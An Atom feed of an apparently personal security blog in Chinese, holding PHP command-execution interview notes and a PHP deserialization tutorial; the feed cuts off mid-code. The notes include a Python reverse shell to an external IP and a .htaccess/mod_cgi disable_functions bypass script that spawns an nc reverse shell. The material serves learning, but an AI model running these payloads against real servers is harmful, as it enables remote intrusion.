<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jianghuxia&#39;s blog</title>
  
  <subtitle>Everyday very nice!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jianghuxia.github.io/"/>
  <updated>2019-04-15T14:06:13.256Z</updated>
  <id>https://jianghuxia.github.io/</id>
  
  <author>
    <name>jianghuxia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>360xamszb</title>
    <link href="https://jianghuxia.github.io/2019/04/15/360xamszb/"/>
    <id>https://jianghuxia.github.io/2019/04/15/360xamszb/</id>
    <published>2019-04-15T14:02:56.000Z</published>
    <updated>2019-04-15T14:06:13.256Z</updated>
    
    <content type="html"><![CDATA[<p>ms准备的材料！！~-~！！！希望能过！！</p><a id="more"></a> <h4 id="1、PHP中命令执行的函数以及会出现的问题"><a href="#1、PHP中命令执行的函数以及会出现的问题" class="headerlink" title="1、PHP中命令执行的函数以及会出现的问题"></a><strong>1、PHP中命令执行的函数以及会出现的问题</strong></h4><h5 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h5><p>执行外部命令，并且显示输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content:text/html;charset=utf-8&apos;);</span><br><span class="line">echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">system(&apos;dir&apos;, $retval);</span><br><span class="line">// 打印更多信息</span><br><span class="line">echo &apos;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;hr /&gt;Return value: &apos; . $retval;        //成功执行则返回0，反之1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/15/360xamszb/1555310463355.png" alt="1555310463355"></p><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><p>执行一个外部命令</p><p><img src="/2019/04/15/360xamszb/1555311094496.png" alt="1555311094496"></p><p>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。</p><h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p><p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 <strong>NULL</strong>，即无输出。</p><p><img src="/2019/04/15/360xamszb/1555311592153.png" alt="1555311592153"></p><h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h5><p>执行外部程序并且显示原始输出</p><p><img src="/2019/04/15/360xamszb/1555311923116.png" alt="1555311923116"></p><p>不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据</p><h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h5><p>(PHP 4 &gt;= 4.2.0, PHP 5, PHP 7)</p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：<code>PHP 4 &gt;= 4.2.0, PHP 5</code></p><p>在做渗透的时候被<code>d[isable_functions</code>](<a href="http://www.moonsec.com/tag/isable_functions)卡住不能[执行命令](http://www.moonsec.com/tag/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4)是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。" target="_blank" rel="noopener">http://www.moonsec.com/tag/isable_functions)卡住不能[执行命令](http://www.moonsec.com/tag/%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4)是家常便饭，今天在一国外虚拟主机上又被卡了，但我在执行phpinfo();的时候眼前闪过–enable-pcntl。当时我就偷笑了，没啥好说的，我一直强调渗透要细心做人做事也一样。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(“/bin/bash”, <span class="keyword">array</span>(“/tmp/b4dboy.sh”));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  pcntl_exec(<span class="string">"/usr/bin/python"</span>,<span class="keyword">array</span>(<span class="string">'-c'</span>, <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h5><h5 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a><strong>proc_open</strong>()</h5><p><a href="https://blog.csdn.net/weixin_43999372/article/details/87925442" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></p><p><strong>2、PHP中系统执行的函数以及会出现的问题</strong></p><p><strong>3、变量覆盖问题</strong></p><p><strong>4、有没有审计到什么漏洞</strong></p><p><strong>5、问了一些漏洞的名字和问了下形成原因</strong></p><p><strong>6、渗透中常见的端口以及是什么应用</strong></p><p><strong>7、Ssrf中怎么拿shell、还有一些绕过方式</strong></p><p><strong>8、Xss的一些绕过方式，如果在href中可以用什么编码绕过以及网页渲染中他对不同编码的渲染前后顺序。</strong></p><p><strong>8、扫描器去重、扫描器的功能流程介绍。</strong></p><p><strong>9、平时在寝室怎么学习的</strong></p><p><strong>10、学习了多久，聊了下一些学习方式然后口头说暑假实习offer没什么问题。</strong></p><h2 id="htaccess：不止重定向"><a href="#htaccess：不止重定向" class="headerlink" title=".htaccess：不止重定向"></a>.htaccess：不止重定向</h2><p>大家对.htaccess文件一定不陌生，没错，在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。</p><p>关于mode_cgi，可以参考apache的官方说明：<a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html</a>。</p><p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互，这就意味着，你可以用C或者python编写WEB应用，听起来我们好像可以做任何apache权限用户能做的事情了，那么到底如何实现呢？</p><p>首先需要满足几个条件，第一，必须是apache环境，第二，mod_cgi已经启用（在我的环境下是默认启用的），第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none，第四，必须有权限写.htaccess文件。其实这几个条件还是比较容易满足的，满足了以上的条件，就可以“搞事情”了。</p><p>在apache的配置中，有一个非常重要的指令，Options，Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：<a href="http://www.365mini.com/page/apache-options-directive.htm" target="_blank" rel="noopener">http://www.365mini.com/page/apache-options-directive.htm</a>，当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本。除了Options，我们还要配合另外一个AddHandler指令来使用，如果你对AddHandler不太熟悉没关系，这么解释一下就容易理解多了：AddType我们肯定很熟悉，比如配置apache对PHP的支持的时候，经常会添加一行类似AddTypeapplication/x-httpd-php .php这样的配置，这其实是指定了文件扩展名和内容类型之间的映射关系，而AddHandler则是指定扩展名和处理程序之间的关系，也就是说，可以指定某个特定的扩展名的文件，如何来进行处理。</p><p>有了Options和AddHandler，我们就可以随便指定一个特定的文件扩展名以特定的程序来处理，这样思路就很清晰了：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p><p>POC如下，附注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &quot;nc -c&apos;/bin/bash&apos; 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口</span><br><span class="line">$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell</span><br><span class="line">$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500</span><br><span class="line">$shellfile .=&quot;$cmd&quot;; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_GET[&apos;checked&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(&apos;.htaccess&apos;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); </span><br><span class="line">    header(&apos;Location: &apos; . $_SERVER[&apos;PHP_SELF&apos;]. &apos;?checked=true&apos;); //执行环境的检查</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(&apos;mod_cgi&apos;,apache_get_modules()); // 检测mod_cgi是否开启</span><br><span class="line">    $writable = is_writable(&apos;.&apos;); //检测当前目录是否可写</span><br><span class="line">    $htaccess = !empty($_SERVER[&apos;HTACCESS&apos;]);//检测是否启用了.htaccess</span><br><span class="line">        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(&quot;Backing </span><br><span class="line">up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in </span><br><span class="line">.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess</span><br><span class="line">        </span><br><span class="line">checkEnabled(&quot;Write </span><br><span class="line">.htaccessfile&quot;,file_put_contents(&apos;.htaccess&apos;,&quot;Options </span><br><span class="line">+ExecCGI\nAddHandlercgi-script </span><br><span class="line">.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名</span><br><span class="line">        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&apos;shell.dizzle&apos;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件</span><br><span class="line">        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限</span><br><span class="line">        echo &quot;Executing the script now.Check your listener &lt;img src = &apos;shell.dizzle&apos; style =&apos;display:none;&apos;&gt;&quot;; //调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们在本地开nc监听4444端口，然后在浏览器中打开这个页面，如果执行成功，将会反弹一个shell到4444端口：</p><p><a href="http://image.3001.net/images/20180419/15241160891897.png" target="_blank" rel="noopener"><img src="/2019/04/15/360xamszb/15241160891897.png!small" alt="3.png"></a></p><p>当访问POC的时候，成功反弹了一个shell到本地的4444端口，可以看到执行id命令后的回显。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ms准备的材料！！~-~！！！希望能过！！&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>serialize与unserialize</title>
    <link href="https://jianghuxia.github.io/2019/03/20/serialize%E4%B8%8Eunserialize/"/>
    <id>https://jianghuxia.github.io/2019/03/20/serialize与unserialize/</id>
    <published>2019-03-20T10:55:02.000Z</published>
    <updated>2019-03-20T10:59:20.247Z</updated>
    
    <content type="html"><![CDATA[<p>相对于网上其他关于Serialize的讲解，不下万篇，学习笔记，稍微总结一番。本篇文章按照<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a>，进行学习指导，基础内容略过。</p><a id="more"></a> <h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>先举个例子说明<code>serialize()</code>与<code>unserialize()</code></p><p><img src="/2019/03/20/serialize与unserialize/1552959114112.png" alt="1552959114112"></p><p>显而易见，两个函数的例子所表达的形式就是这么简单。</p><h3 id="再捡个栗子"><a href="#再捡个栗子" class="headerlink" title="再捡个栗子"></a>再捡个栗子</h3><p>接下来看看下面的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type:text;charset=utf-8'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"hahaha"</span>;</span><br><span class="line">    <span class="keyword">public</span> $sex = <span class="string">"woman"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="string">"7"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example = <span class="keyword">new</span> DemoClass();<span class="comment">//生成新对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize($example);<span class="comment">//输出结果：O:9:"DemoClass":3:&#123;s:4:"name";s:6:"hahaha";s:3:"sex";s:5:"woman";s:3:"age";s:1:"7";&#125;</span></span><br><span class="line"></span><br><span class="line">$example-&gt;name = <span class="string">"yinfeng"</span>;</span><br><span class="line">$example-&gt;sex = <span class="string">"man"</span>;</span><br><span class="line">$example-&gt;age = <span class="string">"18"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($example);<span class="comment">//输出结果：O:9:"DemoClass":3:&#123;s:4:"name";s:7:"yinfeng";s:3:"sex";s:3:"man";s:3:"age";s:2:"18";&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$val = serialize($example);</span><br><span class="line">$NewExample = unserialize($val);</span><br><span class="line">print_r($NewExample);</span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;name;<span class="comment">//输出结果：yinfeng</span></span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;sex;<span class="comment">//输出结果：man</span></span><br><span class="line"><span class="keyword">echo</span> $NewExample-&gt;age;<span class="comment">//输出结果：18</span></span><br></pre></td></tr></table></figure><p>针对其中的代码分析，可以看到<code>serialize</code>序列化对象后（<code>echo serialize($example);</code>），得到的是<code>O:9:&quot;DemoClass&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;yinfeng&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;}</code>；而<code>unserialize</code>序列化对象后（<code>print_r($NewExample);</code>）。 下图呈现两种函数执行形式：</p><p><img src="/2019/03/20/serialize与unserialize/1552956021755.png" alt="1552956021755"></p><p>可以看到<code>serialize</code>序列化对象，得到的是对象引用类的字符串输出，<code>unserialize</code>得到的结果与之相反，将对象引用类的字符串输出转化为类中引用值的呈现模式。</p><h3 id="深入栗子"><a href="#深入栗子" class="headerlink" title="深入栗子"></a>深入栗子</h3><p>在php官方的简述中，有以下红标记的描述，提到了<code>__sleep（）</code>和<code>__wakeup()</code>,只是啥呢，以第一个栗子引申出来剖析</p><p><img src="/2019/03/20/serialize与unserialize/1552959481831.png" alt="1552959481831"></p><p>还是一样的代码，不过类中我们加了一些东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'Tom'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __sleep() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __construct() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------0--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a=<span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------1--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a_value=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a_value.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------2--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$a_uns=unserialize($a_value);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------3--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">print_r($a_uns);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>.<span class="string">"------------------4--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure><p><code>__wakeup()</code>、<code>__construct()</code>、<code>__destruct()</code>这三个函数是干嘛的呢</p><ul><li>构造函数<code>__construct()</code>：当对象创建(new)时会自动调用。但在<code>unserialize()</code>时是不会自动调用的。</li><li>析构函数<code>__destruct()</code>：当对象被销毁时会自动调用。</li><li>魔法函数<code>__wakeup()</code> ：<code>unserialize()</code>时会自动调用。</li></ul><p>我们先来看看运行结果：</p><p><img src="/2019/03/20/serialize与unserialize/1552982483785.png" alt="1552982483785"></p><p>可以看到，在创建<code>a</code>对象时，自动调用了<code>__construct（）</code>；<code>serialize($a)</code>时调用<code>__sleep</code>函数；<code>unserialize($a_value)</code>时调用了<code>__wakeup()</code>。</p><p>而在其中，不知你是否发现其中<code>__sleep()</code>我是这样写的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __sleep() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>相对于其他函数，多了个<code>return array(&quot;name&quot;);</code>，为什么呢？</p><p>在<code>php</code>文档中，针对这个原因，是这样描述的</p><p><img src="/2019/03/20/serialize与unserialize/1552981443700.png" alt="1552981443700"></p><p>其中，不知你看到这句没</p><p><img src="/2019/03/20/serialize与unserialize/1552982878692.png" alt="1552982878692"></p><p>我们试试没有<code>return</code>返回值的情况</p><p><img src="/2019/03/20/serialize与unserialize/1552983144120.png" alt="1552983144120"></p><p>不加这句的后果，如下图：</p><p><img src="/2019/03/20/serialize与unserialize/1552983410764.png" alt="1552983410764"></p><p>那如果，我返回的值设置不是<code>name</code>时，即这里改为<code>return array(&quot;namef&quot;);</code>，以下是报错结果</p><p><img src="/2019/03/20/serialize与unserialize/1552982312376.png" alt="1552982312376"></p><p>这样的描述，是否能更好解决你的疑问呢？</p><h3 id="构造栗子"><a href="#构造栗子" class="headerlink" title="构造栗子"></a>构造栗子</h3><p>现在我们看看下面这段代码，尝试加在刚刚的代码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$Str_1 = <span class="string">'O:1:"A":1:&#123;s:4:"name";s:4:"Anny";&#125;'</span>;</span><br><span class="line">$Un_serialize = unserialize($Str_1);        <span class="comment">//使用unserialize回调__wakeup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"------------------5--------------------"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">print_r($Un_serialize);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>也许你注意到了<code>$Str_1</code>的值，没错，这次我们通过自行构造一个<code>name</code>为<code>Anny</code>，看看反序列化后的值。</p><p><img src="/2019/03/20/serialize与unserialize/1552994154348.png" alt="1552994154348"></p><p>这里就需要我们想想，反序列化的漏洞是如何体现的呢？本质原因就是我们可以构造一串伪造的字符串，通过<code>unserialize</code>函数，覆盖掉原本类成员变量的默认值。这一点就像C语言中的构造函数，传入的值会取代原本其成员变量的默认值。</p><p>有兴趣的同学可以试试下面的$Str_1的替换，看看会产生什么结果？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Str_1 = <span class="string">'O:14:"Test_serialize":1:&#123;s:4:"name";s:4:"test";&#125;'</span>;</span><br></pre></td></tr></table></figure><p>你能直观的看到，应是下面的内容</p><p><img src="/2019/03/20/serialize与unserialize/1552994528361.png" alt="1552994528361"></p><p>再对比下图</p><p><img src="/2019/03/20/serialize与unserialize/1552994607461.png" alt="1552994607461"></p><p>发现了没，析构函数多了一个？<code>__wakeup</code>函数也多了？这是不是意味着什么呢？</p><p>说了这么多，烦了嘛？接下来，我们来模拟下漏洞场景吧！</p><p>在前面我们提到过，<code>unserialize()</code>时会自动调用魔法函数<code>__wakeup()</code> 。这个漏洞的关键点就在于如何通过<code>__wakeup()</code>中的执行语句，执行危险命令，下面是个简单模拟，在<code>__wakeup()</code>中我们只是输出引用的<code>name</code>的值（那假如<code>__wakeup()</code>中存在其他的**命令呢？）</p><p><img src="/2019/03/20/serialize与unserialize/1552995418499.png" alt="1552995418499"></p><p>再挑白点，看看下面的例子</p><p><img src="/2019/03/20/serialize与unserialize/1552995908480.png" alt="1552995908480"></p><p>如果我将<code>Anny</code>再改成其他，后果可想而知。</p><p><img src="/2019/03/20/serialize与unserialize/1552997497869.png" alt="1552997497869"></p><h3 id="再构栗子"><a href="#再构栗子" class="headerlink" title="再构栗子"></a>再构栗子</h3><h4 id="两个不同类，在一个类中调用另一个类的对象"><a href="#两个不同类，在一个类中调用另一个类的对象" class="headerlink" title="两个不同类，在一个类中调用另一个类的对象"></a>两个不同类，在一个类中调用另一个类的对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Object_serialize&#123;</span><br><span class="line">    var $name = &apos;Tom&apos;;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        echo &quot;__wakeup&quot;;</span><br><span class="line">        echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        $test = new Object_Example($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Object_Example&#123;</span><br><span class="line">    function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $fp = 